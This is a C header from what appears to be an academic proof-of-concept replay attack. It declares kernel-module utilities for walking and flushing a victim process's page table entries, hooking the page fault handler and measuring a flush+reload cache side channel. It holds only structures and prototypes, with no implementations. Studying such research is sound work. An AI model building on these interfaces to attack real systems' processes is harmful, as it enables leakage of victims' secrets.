/*
 * Author: Dimitrios Skarlatos
 * Contact: skarlat2@illinois.edu - http://skarlat2.web.engr.illinois.edu/
 *
 * util.h contains the definition of all the required utility functions
 * to perform the replay attack. The functions include:
 * 1) tracking page tables of a requested virtual address
 * 2) perform the nuke which completly flushes all
 * the page table entries and data from the caches for a specified address.
 * 3) create kernel level mapping to process level memory
 * 4) perform a flush+reload side channel
 * 5) other utility functions used for the attack
*/

#ifndef UTIL_H
#define UTIL_H

#include <asm/cacheflush.h>
#include <asm/io.h>
#include <asm/mmu_context.h>
#include <asm/pgalloc.h>
#include <asm/pgtable.h>
#include <asm/tlb.h>
#include <asm/tlbflush.h>
#include <asm/uaccess.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/hrtimer.h>
#include <linux/hugetlb.h>
#include <linux/interrupt.h>
#include <linux/kernel.h>
#include <linux/ktime.h>
#include <linux/memcontrol.h>
#include <linux/mm.h>
#include <linux/mman.h>
#include <linux/mmu_notifier.h>
#include <linux/module.h>
#include <linux/pagemap.h>
#include <linux/pid.h>
#include <linux/rmap.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/swap.h>
#include <linux/swapops.h>
#include <linux/syscalls.h>
#include <linux/timer.h>

#define DEBUG 1

/*
 * attack_info is a utility struct that maintains all the necessary
 * information to perform the attack. Not all fields are used for
 * poc_v0.
 */
struct attack_info {
  uint64_t nuke_addr;                 // VA to be nuked of the victim process
  struct task_struct *nuke_tsk;       // task_struct of the victim
  pid_t nuke_pid;                     // pid of the victim
  struct mm_struct *nuke_mm;          // mm_struct of the victim
  struct vm_area_struct *monitor_vma; // vma of the monitor
  uint64_t monitor_addr[64];          // VA to be monitored currently
  uint64_t monitor_addr_start[64];    // VA to be monitored
  void *monitor_kaddr[64];            // Kernel mapping of the monitor_addr
  struct page *monitor_page[64];      // the page of the monitor_addr
  pte_t *nuke_ptep;
  spinlock_t **ptlp; // splinlock used for locking page table entries
  uint32_t error;    // used to track errors at different stages
  uint32_t monitors;
};

/******************************************************/
/*
 * functions implemented in the memory.c of the kernel
 */

/*
 * set_attack configures the page fault handler to track
 * the specified pte for page faults and enables the attack
 * @victim_pte is pte entry that the attack will be performed on
 * @value enables/disables the attack (0 -> False)
 */
void set_attack(pte_t *victim_pte, int value);

/*
 * set_attack_pte configures the page fault handler to track
 * the specified pte for page faults
 * @victim_pte is pte entry that the attack will be performed on
 * @value is ignored in poc_v0
 */
void set_attack_pte(pte_t *victim_pte, int value);

/*
 * set_attack_value configures the page fault handler to track
 * the specified pte for page faults
 * @victim_pte is ignored in poc_v0
 * @value enables/disables the attack (0 -> False)
 */
void set_attack_value(pte_t *victim_pte, int value);

/*
 * check_attack performs physical address comparison of
 * the current page faulting pte and pte under attack
 * the final result is based on the pte_same
 * @fault_pte is the currently faulting pte
 */
int check_attack(pte_t *fault_pte);

/*
 * set_print_msg_attack enables or disabled message printing
 * WARNING: When enabled every page fault will dump information
 * use only for debugging purposes.
 * @value enables/disables printing (0 -> False)
 */
void set_print_msg_attack(int value);

/*
 * get_pf_status reutrns the status of the attack in case we want to bypass
 * an other attacking thread. Not used for poc_v0
 */
int get_pf_status(void);

/*
 * set_pf_status sets the status of the attack in we want to bypass
 * an other attacking thread. Not used for poc_v0
 */
int set_pf_status(int val);

/******************************************************/

/******************************************************/
/*
 * functions implemented in the util.c
 */

uint64_t do_page_walk(struct mm_struct *mm, uint64_t address, pte_t **ptepp, spinlock_t **ptlp);

void setup_nuke_structs(struct attack_info *info, uint64_t address);
void setup_monitor_structs(struct attack_info *info, uint64_t address, uint32_t index);

void pf_prep(struct attack_info *info, uint64_t address, uint32_t tot_monitor);
void pf_prep_lockless(struct attack_info *info, uint64_t address);
void pf_redo(struct attack_info *info, uint64_t address);
void cause_long_latency(struct attack_info *info, uint64_t address);

int nuke_lock(struct mm_struct *mm, uint64_t address, spinlock_t **ptlp, int present);
int nuke_lockless(struct mm_struct *mm, uint64_t address, int present);
int nuke_lockless_partial(struct mm_struct *mm, uint64_t address, int present);

void print_info(struct attack_info *info);

void asm_clflush(uint64_t addr);
uint32_t asm_cctime(uint64_t addr);
uint64_t check_side_channel_single(uint64_t address, uint32_t index);

/******************************************************/
#endif
